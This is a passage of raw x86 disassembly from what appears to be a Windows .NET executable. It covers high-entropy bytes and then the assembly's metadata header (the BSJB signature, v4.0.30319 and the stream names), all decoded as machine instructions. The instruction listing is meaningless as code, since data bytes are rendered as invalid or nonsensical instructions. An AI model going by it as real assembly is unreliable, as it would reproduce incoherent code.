  40857c:	f1                   	int1
  40857d:	80 bf 44 6a 76 b1 dd 	cmpb   $0xdd,-0x4e8995bc(%edi)
  408584:	bd fa ce c2 7c       	mov    $0x7cc2cefa,%ebp
  408589:	32 d7                	xor    %bh,%dl
  40858b:	4a                   	dec    %edx
  40858c:	ee                   	out    %al,(%dx)
  40858d:	b4 e7                	mov    $0xe7,%ah
  40858f:	3a dd                	cmp    %ch,%bl
  408591:	8d                   	lea    (bad),%ecx
  408592:	ce                   	into
  408593:	dc e2                	fsub   %st,%st(2)
  408595:	c6 42 6f 0e          	movb   $0xe,0x6f(%edx)
  408599:	f8                   	clc
  40859a:	6e                   	outsb  %ds:(%esi),(%dx)
  40859b:	b2 d8                	mov    $0xd8,%dl
  40859d:	eb 6d                	jmp    0x40860c
  40859f:	b4 7a                	mov    $0x7a,%ah
  4085a1:	3d a5 ca a4 fc       	cmp    $0xfca4caa5,%eax
  4085a6:	76 b3                	jbe    0x40855b
  4085a8:	c5 7f 4a             	lds    0x4a(%edi),%edi
  4085ab:	ad                   	lods   %ds:(%esi),%eax
  4085ac:	90                   	nop
  4085ad:	9a 6a de bc be 96 ff 	lcall  $0xff96,$0xbebcde6a
  4085b4:	4c                   	dec    %esp
  4085b5:	73 25                	jae    0x4085dc
  4085b7:	fd                   	std
  4085b8:	7a f4                	jp     0x4085ae
  4085ba:	83 6f 3a cd          	subl   $0xffffffcd,0x3a(%edi)
  4085be:	05 88 69 ea 39       	add    $0x39ea6988,%eax
  4085c3:	29 3d 2d ce bf ad    	sub    %edi,0xadbfce2d
  4085c9:	85 cc                	test   %ecx,%esp
  4085cb:	13 e5                	adc    %ebp,%esp
  4085cd:	94                   	xchg   %eax,%esp
  4085ce:	08 65 d5             	or     %ah,-0x2b(%ebp)
  4085d1:	28 54 c7 f2          	sub    %dl,-0xe(%edi,%eax,8)
  4085d5:	1f                   	pop    %ds
  4085d6:	3e 1b a4 bf e0 74 a4 	sbb    %ds:0x4ea474e0(%edi,%edi,4),%esp
  4085dd:	4e 
  4085de:	84 d5                	test   %dl,%ch
  4085e0:	67 c3                	addr16 ret
  4085e2:	b9 db 4b 0f 1e       	mov    $0x1e0f4bdb,%ecx
  4085e7:	2d 6f 6d 7d 9c       	sub    $0x9c7d6d6f,%eax
  4085ec:	dc eb                	fsubr  %st,%st(3)
  4085ee:	db 23                	(bad) (%ebx)
  4085f0:	83 dd ae             	sbb    $0xffffffae,%ebp
  4085f3:	7c 8f                	jl     0x408584
  4085f5:	cd f0                	int    $0xf0
  4085f7:	d7                   	xlat   %ds:(%ebx)
  4085f8:	45                   	inc    %ebp
  4085f9:	d4 31                	aam    $0x31
  4085fb:	de cc                	fmulp  %st,%st(4)
  4085fd:	4b                   	dec    %ebx
  4085fe:	06                   	push   %es
  4085ff:	24 02                	and    $0x2,%al
  408601:	4e                   	dec    %esi
  408602:	2a b5 3b 8e 67 63    	sub    0x63678e3b(%ebp),%dh
  408608:	b6 4e                	mov    $0x4e,%dh
  40860a:	c0 33 f0             	shlb   $0xf0,(%ebx)
  40860d:	55                   	push   %ebp
  40860e:	25 b7 9e 2b d5       	and    $0xd52b9eb7,%eax
  408613:	28 0c 28             	sub    %cl,(%eax,%ebp,1)
  408616:	8d 02                	lea    (%edx),%eax
  408618:	5f                   	pop    %edi
  408619:	fb                   	sti
  40861a:	b7 ae                	mov    $0xae,%bh
  40861c:	3e 83 5f b8 ae       	sbbl   $0xffffffae,%ds:-0x48(%edi)
  408621:	ae                   	scas   %es:(%edi),%al
  408622:	ab                   	stos   %eax,%es:(%edi)
  408623:	4f                   	dec    %edi
  408624:	91                   	xchg   %eax,%ecx
  408625:	5a                   	pop    %edx
  408626:	81 f7 78 13 f9 15    	xor    $0x15f91378,%edi
  40862c:	84 37                	test   %dh,(%edi)
  40862e:	90                   	nop
  40862f:	66 f8                	data16 clc
  408631:	d9 fd                	fscale
  408633:	e3 4f                	jecxz  0x408684
  408635:	5b                   	pop    %ebx
  408636:	0f 8d d4 79 2d cd    	jge    0xcd6e0010
  40863c:	f1                   	int1
  40863d:	a3 c7 19 93 72       	mov    %eax,0x729319c7
  408642:	59                   	pop    %ecx
  408643:	4a                   	dec    %edx
  408644:	ad                   	lods   %ds:(%esi),%eax
  408645:	8b 8f 79 03 1e 1f    	mov    0x1f1e0379(%edi),%ecx
  40864b:	fb                   	sti
  40864c:	73 2b                	jae    0x408679
  40864e:	f0 e1 7a             	lock loope 0x4086cb
  408651:	f0 f1                	lock int1
  408653:	18 66 85             	sbb    %ah,-0x7b(%esi)
  408656:	6b 0d 54 f6 ec 1e 83 	imul   $0xffffff83,0x1eecf654,%ecx
  40865d:	ce                   	into
  40865e:	3e b6 f5             	ds mov $0xf5,%dh
  408661:	0c 2d                	or     $0x2d,%al
  408663:	ec                   	in     (%dx),%al
  408664:	bb 3b fc 52 05       	mov    $0x552fc3b,%ebx
  408669:	64 7a 22             	fs jp  0x40868e
  40866c:	1e                   	push   %ds
  40866d:	69 5f 6d 9e 50 d3 2d 	imul   $0x2dd3509e,0x6d(%edi),%ebx
  408674:	29 d3                	sub    %edx,%ebx
  408676:	ca ff 3a             	lret   $0x3aff
  408679:	f0 3b f9             	lock cmp %ecx,%edi
  40867c:	a2 d8 29 d1 c7       	mov    %al,0xc7d129d8
  408681:	92                   	xchg   %eax,%edx
  408682:	78 e5                	js     0x408669
  408684:	ec                   	in     (%dx),%al
  408685:	21 f7                	and    %esi,%edi
  408687:	c5 af b4 70 61 88    	lds    -0x779e8f4c(%edi),%ebp
  40868d:	f6 50 da             	notb   -0x26(%eax)
  408690:	df 56 b9             	fists  -0x47(%esi)
  408693:	27                   	daa
  408694:	9d                   	popf
  408695:	c2 fb aa             	ret    $0xaafb
  408698:	84 32                	test   %dh,(%edx)
  40869a:	59                   	pop    %ecx
  40869b:	7b cb                	jnp    0x408668
  40869d:	e2 49                	loop   0x4086e8
  40869f:	df 11                	fists  (%ecx)
  4086a1:	39 1e                	cmp    %ebx,(%esi)
  4086a3:	8e c8                	mov    %eax,%cs
  4086a5:	f9                   	stc
  4086a6:	89 f8                	mov    %edi,%eax
  4086a8:	e4 f7                	in     $0xf7,%al
  4086aa:	41                   	inc    %ecx
  4086ab:	7f a2                	jg     0x40864f
  4086ad:	56                   	push   %esi
  4086ae:	81 df 10 1b e8 21    	sbb    $0x21e81b10,%edi
  4086b4:	de f5                	fdivp  %st,%st(5)
  4086b6:	11 af 97 a1 ad 9a    	adc    %ebp,-0x65525e69(%edi)
  4086bc:	28 93 7d b8 2d 23    	sub    %dl,0x232db87d(%ebx)
  4086c2:	ef                   	out    %eax,(%dx)
  4086c3:	4d                   	dec    %ebp
  4086c4:	f7 65 97             	mull   -0x69(%ebp)
  4086c7:	f1                   	int1
  4086c8:	08 b1 f5 be 33 89    	or     %dh,-0x76cc410b(%ecx)
  4086ce:	fe                   	(bad)
  4086cf:	d9 46 13             	flds   0x13(%esi)
  4086d2:	be f0 16 fb eb       	mov    $0xebfb16f0,%esi
  4086d7:	b0 6b                	mov    $0x6b,%al
  4086d9:	08 de                	or     %bl,%dh
  4086db:	55                   	push   %ebp
  4086dc:	d0 36                	shlb   $1,(%esi)
  4086de:	85 6b 49             	test   %ebp,0x49(%ebx)
  4086e1:	f6 1c db             	negb   (%ebx,%ebx,8)
  4086e4:	22 e9                	and    %cl,%ch
  4086e6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4086e7:	ba 0b 0e 75 02       	mov    $0x2750e0b,%edx
  4086ec:	2e 52                	cs push %edx
  4086ee:	4f                   	dec    %edi
  4086ef:	f1                   	int1
  4086f0:	89 e0                	mov    %esp,%eax
  4086f2:	c5 b7 f0 e1 2b 4e    	lds    0x4e2be1f0(%edi),%esi
  4086f8:	2f                   	das
  4086f9:	8b 4e 06             	mov    0x6(%esi),%ecx
  4086fc:	f5                   	cmc
  4086fd:	58                   	pop    %eax
  4086fe:	cb                   	lret
  4086ff:	f0 ae                	lock scas %es:(%edi),%al
  408701:	e0 6b                	loopne 0x40876e
  408703:	b1 e1                	mov    $0xe1,%cl
  408705:	fd                   	std
  408706:	5c                   	pop    %esp
  408707:	7b 6c                	jnp    0x408775
  408709:	5b                   	pop    %ebx
  40870a:	23 ef                	and    %edi,%ebp
  40870c:	70 db                	jo     0x4086e9
  40870e:	fa                   	cli
  40870f:	ee                   	out    %al,(%dx)
  408710:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408711:	f2 66 fd             	repnz data16 std
  408714:	ed                   	in     (%dx),%eax
  408715:	ff 27                	jmp    *(%edi)
  408717:	b9 3b a2 5f bb       	mov    $0xbb5fa23b,%ecx
  40871c:	e3 f9                	jecxz  0x408717
  40871e:	0a de                	or     %dh,%bl
  408720:	3f                   	aas
  408721:	ef                   	out    %eax,(%dx)
  408722:	6b 86 6d 70 92 5e 3b 	imul   $0x3b,0x5e92706d(%esi),%eax
  408729:	a2 d7 51 9e 71       	mov    %al,0x719e51d7
  40872e:	ed                   	in     (%dx),%eax
  40872f:	8e eb                	mov    %ebx,%gs
  408731:	76 51                	jbe    0x408784
  408733:	78 3e                	js     0x408773
  408735:	92                   	xchg   %eax,%edx
  408736:	1d 55 57 76 33       	sbb    $0x33765755,%eax
  40873b:	76 c7                	jbe    0x408704
  40873d:	f1                   	int1
  40873e:	6f                   	outsl  %ds:(%esi),(%dx)
  40873f:	7c 2f                	jl     0x408770
  408741:	15 fc 86 15 16       	adc    $0x161586fc,%eax
  408746:	d1 d6                	rcl    $1,%esi
  408748:	7b 2f                	jnp    0x408779
  40874a:	5a                   	pop    %edx
  40874b:	90                   	nop
  40874c:	ff e1                	jmp    *%ecx
  40874e:	45                   	inc    %ebp
  40874f:	c0 df 00             	rcr    $0x0,%bh
  408752:	00 00                	add    %al,(%eax)
  408754:	00 00                	add    %al,(%eax)
  408756:	00 00                	add    %al,(%eax)
  408758:	42                   	inc    %edx
  408759:	53                   	push   %ebx
  40875a:	4a                   	dec    %edx
  40875b:	42                   	inc    %edx
  40875c:	01 00                	add    %eax,(%eax)
  40875e:	01 00                	add    %eax,(%eax)
  408760:	00 00                	add    %al,(%eax)
  408762:	00 00                	add    %al,(%eax)
  408764:	0c 00                	or     $0x0,%al
  408766:	00 00                	add    %al,(%eax)
  408768:	76 34                	jbe    0x40879e
  40876a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40876d:	33 30                	xor    (%eax),%esi
  40876f:	33 31                	xor    (%ecx),%esi
  408771:	39 00                	cmp    %eax,(%eax)
  408773:	00 00                	add    %al,(%eax)
  408775:	00 05 00 6c 00 00    	add    %al,0x6c00
  40877b:	00 30                	add    %dh,(%eax)
  40877d:	0f 00 00             	sldt   (%eax)
  408780:	23 7e 00             	and    0x0(%esi),%edi
  408783:	00 9c 0f 00 00 04 0e 	add    %bl,0xe040000(%edi,%ecx,1)
  40878a:	00 00                	add    %al,(%eax)
  40878c:	23 53 74             	and    0x74(%ebx),%edx
  40878f:	72 69                	jb     0x4087fa
  408791:	6e                   	outsb  %ds:(%esi),(%dx)
  408792:	67 73 00             	addr16 jae 0x408795
  408795:	00 00                	add    %al,(%eax)
  408797:	00 a0 1d 00 00 64    	add    %ah,0x6400001d(%eax)
  40879d:	01 00                	add    %eax,(%eax)
  40879f:	00 23                	add    %ah,(%ebx)
  4087a1:	55                   	push   %ebp
  4087a2:	53                   	push   %ebx
  4087a3:	00 04 1f             	add    %al,(%edi,%ebx,1)
  4087a6:	00 00                	add    %al,(%eax)
  4087a8:	10 00                	adc    %al,(%eax)
  4087aa:	00 00                	add    %al,(%eax)
  4087ac:	23 47 55             	and    0x55(%edi),%eax
  4087af:	49                   	dec    %ecx
  4087b0:	44                   	inc    %esp
  4087b1:	00 00                	add    %al,(%eax)
  4087b3:	00 14 1f             	add    %dl,(%edi,%ebx,1)
  4087b6:	00 00                	add    %al,(%eax)
  4087b8:	10 05 00 00 23 42    	adc    %al,0x42230000
  4087be:	6c                   	insb   (%dx),%es:(%edi)
  4087bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c0:	62 00                	bound  %eax,(%eax)
  4087c2:	00 00                	add    %al,(%eax)
  4087c4:	00 00                	add    %al,(%eax)
  4087c6:	00 00                	add    %al,(%eax)
  4087c8:	02 00                	add    (%eax),%al
  4087ca:	00 0a                	add    %cl,(%edx)
  4087cc:	57                   	push   %edi
  4087cd:	3f                   	aas
  4087ce:	a2 1d 09 03 00       	mov    %al,0x3091d
  4087d3:	00 00                	add    %al,(%eax)
  4087d5:	fa                   	cli
  4087d6:	01 33                	add    %esi,(%ebx)
  4087d8:	00 16                	add    %dl,(%esi)
  4087da:	c4 00                	les    (%eax),%eax
  4087dc:	01 00                	add    %eax,(%eax)
  4087de:	00 00                	add    %al,(%eax)
  4087e0:	42                   	inc    %edx
  4087e1:	00 00                	add    %al,(%eax)
  4087e3:	00 0d 00 00 00 23    	add    %cl,0x23000000
  4087e9:	00 00                	add    %al,(%eax)
  4087eb:	00 50 00             	add    %dl,0x0(%eax)
  4087ee:	00 00                	add    %al,(%eax)
  4087f0:	61                   	popa
  4087f1:	00 00                	add    %al,(%eax)
  4087f3:	00 01                	add    %al,(%ecx)
  4087f5:	00 00                	add    %al,(%eax)
  4087f7:	00 66 00             	add    %ah,0x0(%esi)
  4087fa:	00 00                	add    %al,(%eax)
  4087fc:	05 00 00 00 24       	add    $0x24000000,%eax
  408801:	00 00                	add    %al,(%eax)
  408803:	00 02                	add    %al,(%edx)
  408805:	00 00                	add    %al,(%eax)
  408807:	00 0f                	add    %cl,(%edi)
  408809:	00 00                	add    %al,(%eax)
  40880b:	00 01                	add    %al,(%ecx)
  40880d:	00 00                	add    %al,(%eax)
  40880f:	00 07                	add    %al,(%edi)
  408811:	00 00                	add    %al,(%eax)
  408813:	00 0e                	add    %cl,(%esi)
  408815:	00 00                	add    %al,(%eax)
  408817:	00 01                	add    %al,(%ecx)
  408819:	00 00                	add    %al,(%eax)
  40881b:	00 02                	add    %al,(%edx)
  40881d:	00 00                	add    %al,(%eax)
  40881f:	00 0b                	add    %cl,(%ebx)
  408821:	00 00                	add    %al,(%eax)
  408823:	00 01                	add    %al,(%ecx)
  408825:	00 00                	add    %al,(%eax)
  408827:	00 04 00             	add    %al,(%eax,%eax,1)
  40882a:	00 00                	add    %al,(%eax)
  40882c:	02 00                	add    (%eax),%al
  40882e:	00 00                	add    %al,(%eax)
  408830:	06                   	push   %es
  408831:	00 00                	add    %al,(%eax)
  408833:	00 00                	add    %al,(%eax)
  408835:	00 a7 07 01 00 00    	add    %ah,0x107(%edi)
  40883b:	00 00                	add    %al,(%eax)
  40883d:	00 06                	add    %al,(%esi)
  40883f:	00 6f 0b             	add    %ch,0xb(%edi)
  408842:	23 08                	and    (%eax),%ecx
  408844:	06                   	push   %es
  408845:	00 40 09             	add    %al,0x9(%eax)
  408848:	c8 0c 06 00          	enter  $0x60c,$0x0
  40884c:	da 01                	fiaddl (%ecx)
  40884e:	c0 06 06             	rolb   $0x6,(%esi)
  408851:	00 7d 0c             	add    %bh,0xc(%ebp)
  408854:	c0 06 06             	rolb   $0x6,(%esi)
  408857:	00 df                	add    %bl,%bh
  408859:	09 23                	or     %esp,(%ebx)
  40885b:	08 12                	or     %dl,(%edx)
  40885d:	00 1c 0b             	add    %bl,(%ebx,%ecx,1)
  408860:	e6 09                	out    %al,$0x9
  408862:	12 00                	adc    (%eax),%al
  408864:	ff 03                	incl   (%ebx)
  408866:	e6 09                	out    %al,$0x9
  408868:	0a 00                	or     (%eax),%al
  40886a:	7b 08                	jnp    0x408874
  40886c:	fd                   	std
  40886d:	0a 06                	or     (%esi),%al
  40886f:	00 d7                	add    %dl,%bh
  408871:	08 23                	or     %ah,(%ebx)
  408873:	08 0a                	or     %cl,(%edx)
  408875:	00 63 0b             	add    %ah,0xb(%ebx)
  408878:	fd                   	std
  408879:	0a 06                	or     (%esi),%al
  40887b:	00 7c 06 23          	add    %bh,0x23(%esi,%eax,1)
  40887f:	08 06                	or     %al,(%esi)
  408881:	00 53 04             	add    %dl,0x4(%ebx)
  408884:	23 08                	and    (%eax),%ecx
  408886:	06                   	push   %es
  408887:	00 7c 07 f9          	add    %bh,-0x7(%edi,%eax,1)
  40888b:	09 06                	or     %eax,(%esi)
  40888d:	00 13                	add    %dl,(%ebx)
  40888f:	07                   	pop    %es
  408890:	23 08                	and    (%eax),%ecx
  408892:	0e                   	push   %cs
  408893:	00 da                	add    %bl,%dl
  408895:	0b 88 0b 06 00 61    	or     0x6100060b(%eax),%ecx
  40889b:	04 23                	add    $0x23,%al
  40889d:	08 06                	or     %al,(%esi)
  40889f:	00 bc 04 23 08 06 00 	add    %bh,0x60823(%esp,%eax,1)
  4088a6:	52                   	push   %edx
  4088a7:	0c 23                	or     $0x23,%al
  4088a9:	08 06                	or     %al,(%esi)
  4088ab:	00 3c 07             	add    %bh,(%edi,%eax,1)
  4088ae:	23 08                	and    (%eax),%ecx
  4088b0:	06                   	push   %es
  4088b1:	00 b6 03 23 08 0e    	add    %dh,0xe082303(%esi)
  4088b7:	00 9f 0c ed 0a 06    	add    %bl,0x60aed0c(%edi)
  4088bd:	00 fc                	add    %bh,%ah
  4088bf:	04 18                	add    $0x18,%al
  4088c1:	0a 12                	or     (%edx),%dl
  4088c3:	00 0d 0c 34 0b 12    	add    %cl,0x120b340c
  4088c9:	00 c0                	add    %al,%al
  4088cb:	0d 34 0b 12 00       	or     $0x120b34,%eax
  4088d0:	9b                   	fwait
  4088d1:	04 34                	add    $0x34,%al
  4088d3:	0b 12                	or     (%edx),%edx
  4088d5:	00 6b 04             	add    %ch,0x4(%ebx)
  4088d8:	34 0b                	xor    $0xb,%al
  4088da:	12 00                	adc    (%eax),%al
  4088dc:	84 07                	test   %al,(%edi)
  4088de:	34 0b                	xor    $0xb,%al
  4088e0:	12 00                	adc    (%eax),%al
  4088e2:	1f                   	pop    %ds
  4088e3:	04 34                	add    $0x34,%al
  4088e5:	0b 12                	or     (%edx),%edx
  4088e7:	00 82 03 34 0b 12    	add    %al,0x120b3403(%edx)
  4088ed:	00 bc 0a 34 0b 06 00 	add    %bh,0x60b34(%edx,%ecx,1)
  4088f4:	aa                   	stos   %al,%es:(%edi)
  4088f5:	09 23                	or     %esp,(%ebx)
  4088f7:	08 0e                	or     %cl,(%esi)
  4088f9:	00 bf 09 ed 0a 0e    	add    %bh,0xe0aed09(%edi)
  4088ff:	00 99 0b b3 00 0e    	add    %bl,0xe00b30b(%ecx)
  408905:	00 81 04 88 0b 06    	add    %al,0x60b8804(%ecx)
  40890b:	00 d7                	add    %dl,%bh
  40890d:	09 c0                	or     %eax,%eax
  40890f:	06                   	push   %es
  408910:	0e                   	push   %cs
  408911:	00 42 00             	add    %al,0x0(%edx)
  408914:	b3 00                	mov    $0x0,%bl
  408916:	0e                   	push   %cs
  408917:	00 4f 0b             	add    %cl,0xb(%edi)
  40891a:	ed                   	in     (%dx),%eax
  40891b:	0a 06                	or     (%esi),%al
  40891d:	00 1a                	add    %bl,(%edx)
  40891f:	00 cd                	add    %cl,%ch
  408921:	00 06                	add    %al,(%esi)
  408923:	00 01                	add    %al,(%ecx)
  408925:	09 93 08 06 00 b7    	or     %edx,-0x48fff9f8(%ebx)
  40892b:	0d a8 08 06 00       	or     $0x608a8,%eax
  408930:	41                   	inc    %ecx
  408931:	04 a8                	add    $0xa8,%al
  408933:	08 06                	or     %al,(%esi)
  408935:	00 36                	add    %dh,(%esi)
  408937:	08 23                	or     %ah,(%ebx)
  408939:	08 06                	or     %al,(%esi)
  40893b:	00 e1                	add    %ah,%cl
  40893d:	08 23                	or     %ah,(%ebx)
  40893f:	08 06                	or     %al,(%esi)
  408941:	00 fe                	add    %bh,%dh
  408943:	07                   	pop    %es
  408944:	71 00                	jno    0x408946
  408946:	12 00                	adc    (%eax),%al
  408948:	ea 07 65 08 06 00 f8 	ljmp   $0xf800,$0x6086507
  40894f:	07                   	pop    %es
  408950:	71 00                	jno    0x408952
  408952:	12 00                	adc    (%eax),%al
  408954:	72 03                	jb     0x408959
  408956:	65 08 06             	or     %al,%gs:(%esi)
  408959:	00 d5                	add    %dl,%ch
  40895b:	0a 23                	or     (%ebx),%ah
  40895d:	08 06                	or     %al,(%esi)
  40895f:	00 aa 0a a8 08 06    	add    %ch,0x608a80a(%edx)
  408965:	00 f5                	add    %dh,%ch
  408967:	01 c0                	add    %eax,%eax
  408969:	06                   	push   %es
  40896a:	06                   	push   %es
  40896b:	00 7b 09             	add    %bh,0x9(%ebx)
  40896e:	23 08                	and    (%eax),%ecx
  408970:	06                   	push   %es
  408971:	00 f1                	add    %dh,%cl
  408973:	05 18 0a 06 00       	add    $0x60a18,%eax
  408978:	5e                   	pop    %esi
  408979:	06                   	push   %es
  40897a:	18 0a                	sbb    %cl,(%edx)
  40897c:	06                   	push   %es
  40897d:	00 25 05 e6 09 db    	add    %ah,0xdb09e605
  408983:	00 52 0a             	add    %dl,0xa(%edx)
  408986:	00 00                	add    %al,(%eax)
  408988:	06                   	push   %es
  408989:	00 4d 05             	add    %cl,0x5(%ebp)
  40898c:	a8 08                	test   $0x8,%al
  40898e:	06                   	push   %es
  40898f:	00 d4                	add    %dl,%ah
  408991:	05 a8 08 06 00       	add    $0x608a8,%eax
  408996:	b5 05                	mov    $0x5,%ch
  408998:	a8 08                	test   $0x8,%al
  40899a:	06                   	push   %es
  40899b:	00 45 06             	add    %al,0x6(%ebp)
  40899e:	a8 08                	test   $0x8,%al
  4089a0:	06                   	push   %es
  4089a1:	00 11                	add    %dl,(%ecx)
  4089a3:	06                   	push   %es
  4089a4:	a8 08                	test   $0x8,%al
  4089a6:	06                   	push   %es
  4089a7:	00 2a                	add    %ch,(%edx)
  4089a9:	06                   	push   %es
  4089aa:	a8 08                	test   $0x8,%al
  4089ac:	06                   	push   %es
  4089ad:	00 64 05 a8          	add    %ah,-0x58(%ebp,%eax,1)
  4089b1:	08 06                	or     %al,(%esi)
  4089b3:	00 39                	add    %bh,(%ecx)
  4089b5:	05 f9 09 06 00       	add    $0x609f9,%eax
  4089ba:	17                   	pop    %ss
  4089bb:	05 f9 09 06 00       	add    $0x609f9,%eax
  4089c0:	98                   	cwtl
  4089c1:	05 a8 08 06 00       	add    $0x608a8,%eax
  4089c6:	7f 05                	jg     0x4089cd
  4089c8:	de 06                	fiadds (%esi)
  4089ca:	00 00                	add    %al,(%eax)
  4089cc:	00 00                	add    %al,(%eax)
  4089ce:	27                   	daa
  4089cf:	00 00                	add    %al,(%eax)
  4089d1:	00 00                	add    %al,(%eax)
  4089d3:	00 01                	add    %al,(%ecx)
  4089d5:	00 01                	add    %al,(%ecx)
  4089d7:	00 01                	add    %al,(%ecx)
  4089d9:	00 00                	add    %al,(%eax)
  4089db:	00 72 07             	add    %dh,0x7(%edx)
  4089de:	bd 00 05 00 01       	mov    $0x1000500,%ebp
  4089e3:	00 02                	add    %al,(%edx)
  4089e5:	00 80 01 10 00 47    	add    %al,0x47001001(%eax)
  4089eb:	0b bd 00 05 00 03    	or     0x3000500(%ebp),%edi
  4089f1:	00 0b                	add    %cl,(%ebx)
  4089f3:	00 0d 01 10 00 7b    	add    %cl,0x7b001001
  4089f9:	00 00                	add    %al,(%eax)
  4089fb:	00 41 00             	add    %al,0x0(%ecx)
  4089fe:	09 00                	or     %eax,(%eax)
  408a00:	16                   	push   %ss
  408a01:	00 05 01 00 00 5a    	add    %al,0x5a000001
  408a07:	01 00                	add    %eax,(%eax)
  408a09:	00 45 00             	add    %al,0x0(%ebp)
  408a0c:	0e                   	push   %cs
  408a0d:	00 16                	add    %dl,(%esi)
  408a0f:	00 00                	add    %al,(%eax)
  408a11:	00 10                	add    %dl,(%eax)
  408a13:	00 5f 09             	add    %bl,0x9(%edi)
  408a16:	52                   	push   %edx
  408a17:	08 05 00 0e 00 1a    	or     %al,0x1a000e00
  408a1d:	00 02                	add    %al,(%edx)
  408a1f:	01 00                	add    %eax,(%eax)
  408a21:	00 20                	add    %ah,(%eax)
  408a23:	01 00                	add    %eax,(%eax)
  408a25:	00 45 00             	add    %al,0x0(%ebp)
  408a28:	19 00                	sbb    %eax,(%eax)
  408a2a:	36 00 03             	add    %al,%ss:(%ebx)
  408a2d:	01 00                	add    %eax,(%eax)
  408a2f:	00 04 01             	add    %al,(%ecx,%eax,1)
  408a32:	00 00                	add    %al,(%eax)
  408a34:	45                   	inc    %ebp
  408a35:	00 19                	add    %bl,(%ecx)
  408a37:	00 3a                	add    %bh,(%edx)
  408a39:	00 02                	add    %al,(%edx)
  408a3b:	01 00                	add    %eax,(%eax)
  408a3d:	00 e8                	add    %ch,%al
  408a3f:	00 00                	add    %al,(%eax)
  408a41:	00 45 00             	add    %al,0x0(%ebp)
  408a44:	19 00                	sbb    %eax,(%eax)
  408a46:	3e 00 02             	add    %al,%ds:(%edx)
  408a49:	01 00                	add    %eax,(%eax)
  408a4b:	00 3a                	add    %bh,(%edx)
  408a4d:	01 00                	add    %eax,(%eax)
  408a4f:	00 45 00             	add    %al,0x0(%ebp)
  408a52:	19 00                	sbb    %eax,(%eax)
  408a54:	42                   	inc    %edx
  408a55:	00 81 01 10 00 21    	add    %al,0x21001001(%ecx)
  408a5b:	07                   	pop    %es
  408a5c:	52                   	push   %edx
  408a5d:	08 05 00 19 00 46    	or     %al,0x46001900
  408a63:	00 80 01 10 00 31    	add    %al,0x31001001(%eax)
  408a69:	09 91 00 05 00 1d    	or     %edx,0x1d000500(%ecx)
  408a6f:	00 47 00             	add    %al,0x0(%edi)
  408a72:	00 00                	add    %al,(%eax)
  408a74:	00 00                	add    %al,(%eax)
  408a76:	43                   	inc    %ebx
  408a77:	0d 00 00 05 00       	or     $0x50000,%eax
  408a7c:	22 00                	and    (%eax),%al
  408a7e:	51                   	push   %ecx
  408a7f:	00 16                	add    %dl,(%esi)
  408a81:	00 2a                	add    %ch,(%edx)
  408a83:	08 0e                	or     %cl,(%esi)
  408a85:	00 13                	add    %dl,(%ebx)
  408a87:	00 bb 01 12 00 51    	add    %bh,0x51001201(%ebx)
  408a8d:	80 01 00             	addb   $0x0,(%ecx)
  408a90:	b6 00                	mov    $0x0,%dh
  408a92:	13 00                	adc    (%eax),%eax
  408a94:	d7                   	xlat   %ds:(%ebx)
  408a95:	03 b6 00 53 80 66    	add    0x66805300(%esi),%esi
  408a9b:	00 ce                	add    %cl,%dh
  408a9d:	00 53 80             	add    %dl,-0x80(%ebx)
  408aa0:	58                   	pop    %eax
  408aa1:	00 d4                	add    %dl,%ah
  408aa3:	00 13                	add    %dl,(%ebx)
  408aa5:	00 65 07             	add    %ah,0x7(%ebp)
  408aa8:	26 00 13             	add    %dl,%es:(%ebx)
  408aab:	00 4a 07             	add    %cl,0x7(%edx)
  408aae:	dc 00                	faddl  (%eax)
  408ab0:	06                   	push   %es
  408ab1:	00 82 0d 30 01 06    	add    %al,0x601300d(%edx)
  408ab7:	00 5b 03             	add    %bl,0x3(%ebx)
  408aba:	d4 00                	aam    $0x0
  408abc:	06                   	push   %es
  408abd:	00 cf                	add    %cl,%bh
  408abf:	0a d4                	or     %ah,%dl
  408ac1:	00 06                	add    %al,(%esi)
  408ac3:	00 5c 04 d4          	add    %bl,-0x2c(%esp,%eax,1)
  408ac7:	00 06                	add    %al,(%esi)
  408ac9:	00 8b 00 26 00 01    	add    %cl,0x1002600(%ebx)
  408acf:	00 ee                	add    %ch,%dh
  408ad1:	02 4c 01 01          	add    0x1(%ecx,%eax,1),%cl
  408ad5:	00 bb 02 55 01 01    	add    %bh,0x1015502(%ebx)
  408adb:	00 88 02 59 01 01    	add    %cl,0x1015902(%eax)
  408ae1:	00 72 02             	add    %dh,0x2(%edx)
  408ae4:	b6 00                	mov    $0x0,%dh
  408ae6:	01 00                	add    %eax,(%eax)
  408ae8:	a3 02 b6 00 01       	mov    %eax,0x100b602
  408aed:	00 04 03             	add    %al,(%ebx,%eax,1)
  408af0:	b6 00                	mov    $0x0,%dh
  408af2:	01 00                	add    %eax,(%eax)
  408af4:	d3 02                	roll   %cl,(%edx)
  408af6:	59                   	pop    %ecx
  408af7:	01 06                	add    %eax,(%esi)
  408af9:	00 2d 01 5c 01 21    	add    %ch,0x21015c01
  408aff:	00 12                	add    %dl,(%edx)
  408b01:	01 60 01             	add    %esp,0x1(%eax)
  408b04:	06                   	push   %es
  408b05:	00 f6                	add    %dh,%dh
  408b07:	00 64 01 06          	add    %ah,0x6(%ecx,%eax,1)
  408b0b:	00 4a 01             	add    %cl,0x1(%edx)
  408b0e:	68 01 13 00 6d       	push   $0x6d001301
  408b13:	09 96 02 13 00 82    	or     %edx,-0x7dffecfe(%esi)
  408b19:	0d b6 00 13 00       	or     $0x1300b6,%eax
  408b1e:	21 09                	and    %ecx,(%ecx)
  408b20:	b6 00                	mov    $0x0,%dh
  408b22:	13 00                	adc    (%eax),%eax
  408b24:	3d 00 b6 00 11       	cmp    $0x1100b600,%eax
  408b29:	00 53 07             	add    %dl,0x7(%ebx)
  408b2c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408b2d:	02 11                	add    (%ecx),%dl
  408b2f:	00 96 03 aa 02 11    	add    %dl,0x1102aa03(%esi)
  408b35:	00 89 0a b3 02 11    	add    %cl,0x1102b30a(%ecx)
  408b3b:	00 7d 0a             	add    %bh,0xa(%ebp)
  408b3e:	b3 02                	mov    $0x2,%bl
  408b40:	11 00                	adc    %eax,(%eax)
  408b42:	ea 01 d4 00 53 80 59 	ljmp   $0x5980,$0x5300d401
  408b49:	08 b6 00 53 80 91    	or     %dh,-0x6e7fad00(%esi)
  408b4f:	00 b6 00 50 20 00    	add    %dh,0x205000(%esi)
  408b55:	00 00                	add    %al,(%eax)
